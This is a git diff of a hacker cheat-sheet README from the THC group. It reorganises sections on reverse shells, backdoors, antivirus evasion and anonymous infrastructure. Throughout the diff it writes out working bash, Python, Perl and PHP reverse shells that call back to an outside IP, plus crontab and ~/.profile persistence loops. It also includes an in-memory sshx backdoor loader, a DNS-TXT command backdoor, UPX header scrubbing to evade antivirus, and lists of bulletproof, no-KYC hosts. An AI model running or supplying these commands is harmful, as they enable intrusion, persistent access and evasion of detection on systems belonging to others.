@@ -45,7 +45,7 @@ Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)
 1. [Data Upload/Download/Exfil](#exfil)
    1. [File Encoding/Decoding](#file-encoding)
    1. [File transfer using cut & paste](#cut-paste)
-   1. [File transfer using screen](#xfer-tmux)
+   1. [File transfer using tmux](#xfer-tmux)
    1. [File transfer using screen](#file-transfer-screen)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
@@ -71,7 +71,8 @@ Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)
       1. [Upgrade a reverse shell to a fully interactive shell](#reverse-shell-interactive)
       1. [Reverse shell with socat (fully interactive)](#reverse-shell-socat)
 1. [Backdoors](#backdoor)
-   1. [Background reverse shell](#backdoor-background-reverse-shell)
+   1. [gs-netcat](#gsnc)
+   2. [sshx.io](#sshx)
    1. [authorized_keys](#backdoor-auth-keys)
    1. [Remote access an entire network](#backdoor-network)
    1. [Smallest PHP backdoor](#php-backdoor)
@@ -1490,22 +1491,13 @@ curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocu
 ---
 <a id="reverse-shell"></a>
 ## 5. Reverse Shell / Dumb Shell
+
+Tip: Use [https://www.revshells.com/](https://www.revshells.com/) 👌
+
 <a id="reverse-shell-gs-netcat"></a>
 **5.i.a. Reverse shell with gs-netcat (encrypted)**
 
-Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell. Both, the YOU and the remote system, can be behind NAT and the traffic is routed via a relay network. It also supports file upload/download (Ctrl-e c) and alarms when the admin logs in. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
-
-```sh
-X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/y)"
-# or X=ExampleSecretChangeMe bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"
-```
-
-To connect to the shell from your workstation:
-```sh
-S=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/y)"
-# or gs-netcat -s ExampleSecretChangeMe -i
-# Add -T to tunnel through TOR
-```
+See [6. Backdoors](#backdoor) for a 1-liner to deploy and access a fully functioning PTY reverse shell using [https://gsocket.io/deploy](https://gsocket.io/deploy).
 
 <a id="reverse-shell-bash"></a>
 **5.i.b. Reverse shell with Bash**
@@ -1524,11 +1516,17 @@ pwncat -lp 1524
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```sh
 # If the current shell is Bash already:
-(bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &
+(bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &) 
 # If the current shell is NOT Bash then we need:
-bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
+bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
 # or hide the bash process as 'kqueue'
-bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
+bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
+```
+
+Alternatively, on the remote system, put this into the `~/.profile` or crontab to re-start the connect-back shell (and also stiops multiple intances from being started):
+
+```sh
+fuser /dev/shm/.busy &>/dev/null || (bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null &)
 ```
 
 <a id="curlshell"></a>
@@ -1612,8 +1610,10 @@ touch /tmp/.fio; tail -f /tmp/.fio | sh -i | telnet 3.13.3.7 31337 >/tmp/.fio
 ```
 Note: Dont forget to `rm /tmp/.fio` after login.
 
+
+
 <a id="revese-shell-remote-moe"></a>
-**5.i.g. Reverse shell with remote.moe and ssh (encrypted)**
+**5.i.h. Reverse shell with remote.moe and ssh (encrypted)**
 
 It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](https://remote.moe):
 
@@ -1640,13 +1640,13 @@ rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p &
 ```
 
 <a id="reverse-shell-python"></a>
-**5.i.h. Reverse shell with Python**
+**5.i.i. Reverse shell with Python**
 ```sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 <a id="reverse-shell-perl"></a>
-**5.i.i. Reverse shell with Perl**
+**5.i.j. Reverse shell with Perl**
 
 ```sh
 # method 1
@@ -1655,7 +1655,7 @@ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotob
 perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 <a id="reverse-shell-php"></a>
-**5.i.j. Reverse shell with PHP**
+**5.i.k. Reverse shell with PHP**
 
 ```sh
 php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
@@ -1721,6 +1721,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 <a id="backdoor"></a>
 ## 6. Backdoors
 
+See [Reverse Shell / Dumb Shell](#reverse-shell) for simple 1-liner reverse shells.
+
+<a id="gsnc"></a>
+**6.i. Reverse shell using gs-netcat**
+
 Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
 ```sh
 bash -c "$(curl -fsSLk https://gsocket.io/y)"
@@ -1734,23 +1739,28 @@ or deploy gsocket by running your own deployment server:
 ```sh
 LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/ys)"  # Notice '/ys' instead of '/y'
 ```
+<a id="sshx"></a>
+**6.ii. Reverse shell with sshx.io (encrypted)**
 
-<a id="backdoor-background-reverse-shell"></a>
-**6.i. Background reverse shell**
+Access a remote shell from your web browser [https://sshx.io](https://sshx.io).
 
-A reverse shell that keeps trying to connect back to us every 360 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 
-
-```sh
-setsid bash -c 'while :; do bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null
+Pipe be sshx-backdoor directly into memory:
+```shell
+echo $(curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null \
+ |nohup perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3",("-q")' 2>/dev/null \
+ |{ read x;echo "$x";}&)
 ```
 
-or the user's *~/.profile* (also stops multiple instances from being started):
-```sh
-fuser /dev/shm/.busy &>/dev/null || nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 ; sleep 360; done' &>/dev/null &
+Or the lame way:
+```shell
+curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null >.s \
+&& chmod 755 .s \
+&& (PATH=.:$PATH .s -q >.u 2>/dev/null &);
+for _ in {1..10}; do [ -s .u ] && break;sleep 1;done;cat .u;rm -f .u .s;
 ```
 
 <a id="backdoor-auth-keys"></a>
-**6.ii. authorized_keys**
+**6.iii. authorized_keys**
 
 Add your ssh public key to */root/.ssh/authorized_keys*. It's the most reliable backdoor ever :>
 
@@ -1767,7 +1777,7 @@ u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C
 c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
 ```
 <a id="backdoor-network"></a>
-**6.iii. Remote Access to an entire network**
+**6.vi. Remote Access to an entire network**
 
 Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS exit-node on the Host's private LAN which is accessible through the Global Socket Relay Network without the need to run your own relay-server (e.g. access the remote private LAN directly from your workstation):
 
@@ -1789,7 +1799,7 @@ Other methods:
 * [Reverse Wireguard](https://thc.org/segfault/wireguard) - from segfault.net to any (internal) network.
 
 <a id="php-backdoor"></a>
-**6.iv. Smallest PHP Backdoor**
+**6.v. Smallest PHP Backdoor**
 
 Add this line at the beginning of any PHP file:
 ```php
@@ -1830,7 +1840,7 @@ curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts"
 ```
 
 <a id="reverse-dns-backdoor"></a>
-**6.v. Smallest reverse DNS-tunnel Backdoor**
+**6.vi. Smallest reverse DNS-tunnel Backdoor**
 
 Execute arbitrary commands on a server that is _not_ accessible from the public Internet by using a reverse DNS trigger.
 
@@ -1846,16 +1856,16 @@ echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' |base64 -w0
 
 - The DNS TXT payload is limited to 2,048 characters (sometimes 65,535 characters).
 - The implant is a `bootloader`. Use a while loop to download and execute larger paypload via DNS.
-- Check out our favorite places to [register a domain anonymously](#pub): 
+- Check out our favorite places to [register a domain anonymously](#pub). [Cloudflare's](https://www.cloudflare.com) Free-Tier is a good start.
 
 Can also be triggered via `~/.bashrc` or the user's crontab. Use (example):
 ```shell
 # Use a "double bash" to redirect _also_ $()-subshell error to /dev/null:
-bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \"|base64 -d);}"'&>/dev/null
+bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \ \"|base64 -d);}"'&>/dev/null
 ```
 
 <a id="ld-backdoor"></a>
-**6.vi. Local Root Backdoor**
+**6.vii. Local Root Backdoor**
 
 #### 1. Backdooring the dynamic loader with setcap
 
@@ -1883,7 +1893,7 @@ exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setuid(0);os.execlp(\"ba
 ```
 
 <a id="implant"></a>
-**6.vii. Self-Extracting implant**
+**6.viii. Self-Extracting implant**
 
 Create a self-extracting shell-script using [mkegg.sh](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/mkegg.sh) (see source for examples).
 
@@ -2112,7 +2122,7 @@ BIN="mybin"
 upx -qqq /bin/id -o "${BIN}"
 ```
 
-Cleanse the [UPX header](https://github.com/upx/upx/blob/devel/src/stub/src/include/header.S) and 2nd ELF header to fool the Anit-Virus:
+Cleanse the [UPX header](https://github.com/upx/upx/blob/devel/src/stub/src/include/header.S) and 2nd ELF header to fool the Anti-Virus:
 ```shell
 perl -i -0777 -pe 's/^(.{64})(.{0,256})UPX!.{4}/$1$2\0\0\0\0\0\0\0\0/s' "${BIN}"
 perl -i -0777 -pe 's/^(.{64})(.{0,256})\x7fELF/$1$2\0\0\0\0/s' "${BIN}"
@@ -2122,10 +2132,11 @@ Optionally cleanse signatures and traces of UPX:
 ```shell
 cat "${BIN}" \
 | perl -e 'local($/);$_=<>;s/(.*)(\$Info:[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' \
-| perl -e 'local($/);$_=<>;s/(.*)(\$Id:[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' \
-| perl -e 'local($/);$_=<>;s/(.*)(PROT_EXEC\|PROT_WRI[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' >"${BIN}.tmpupx"
-cat "${BIN}.tmpupx" >"${BIN}"
-rm -f "${BIN}.tmpupx"
+| perl -e 'local($/);$_=<>;s/(.*)(\$Id:[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' >"${BIN}.tmpupx"
+mv "${BIN}.tmpupx" "${BIN}"
+grep -Eqm1 "PROT_EXEC\|PROT_WRITE" "${BIN}" \
+&& cat "${BIN}" | perl -e 'local($/);$_=<>;s/(.*)(PROT_EXEC\|PROT_WRI[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' >"${BIN}.tmpupx" \
+&& mv "${BIN}.tmpupx" "${BIN}"
 perl -i -0777 -pe 's/UPX!/\0\0\0\0/sg' "${BIN}"
 ```
 
@@ -2278,7 +2289,7 @@ Deploy: Cut & paste the following onto the target and follow the instructions:
 ```sh
 command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
 && { mkdir -p ~/.config/.pty 2>/dev/null; :; } \
-&& curl -o ~/.config/.pty/pty -fsSL "https://bin.pkgforge.dev/$(uname -m)/Baseutils/util-linux/script" \
+&& curl -o ~/.config/.pty/pty -fsSL "https://bin.pkgforge.dev/$(uname -m)/script" \
 && curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
 && chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty \
 && echo -e '----------\n\e[0;32mSUCCESS\e[0m. Add the following line to \e[0;36m~/.bashrc\e[0m:\e[0;35m' \
@@ -2435,10 +2446,11 @@ https://thc.org/segfault
 Trusted VPN Providers
 1. https://www.mullvad.net
 1. https://www.cryptostorm.is
+2. https://ivpn.net
 1. https://proton.me - Offers FREE VPN
 1. https://vpn.fail - Run by volunteers
 
-Virtual Private Servers
+Virtual Private Servers. Please check [offshore.cat](https://offshore.cat/).
 1. https://www.hetzner.com - Cheap
 2. https://hivecloud.pw - No KYC. Bullet Proof. Accepts Crypto.
 1. https://dmzhost.co - Ignore most abuse requests
@@ -2615,12 +2627,14 @@ Exfil<a id="cloudexfil"></a>
 
 Publishing<a id="pub"></a>
 1. [free BT/DC/eD2k seedbox](https://valdikss.org.ru/schare/)
-1. Or use /onion on [segfault.net](https://www.thc.org/segfault) or plain old https with ngrok.
+1. Or use /onion on [segfault.net](https://www.thc.org/segfault) or plain old https with ngrok
+2. [Cloudflare](https://www.cloudflare.com) - The Free-Tier allows most things (dns + domains + tunnels).
+1. [Njal.la](https://njal.la) - Privacy focused Domain Registrar
 1. [DuckDNS](https://www.duckdns.org/) - Free Domain Names
 1. [AnonDNS](https://anondns.net/) - Free Domain Name (anonymous)
 1. [afraid.org](https://www.afraid.org) - Free Dynamic DNS for your domain
-2. [hostwinds](https://hostwinds.com) - Pay with crypto
-3. [unstoppable domains](https://unstoppabledomains.com) - Pay with crypto
+1. [hostwinds](https://hostwinds.com) - Pay with crypto
+1. [unstoppable domains](https://unstoppabledomains.com) - Pay with crypto
 1. [he.net](https://dns.he.net/) - Free Nameserver service
 1. [0bin](https://0bin.net/) / [paste.ec](https://paste.ec) - Encrypted PasteBin
 1. [pad.riseup.net](https://pad.riseup.net) - Create documents and share them securely
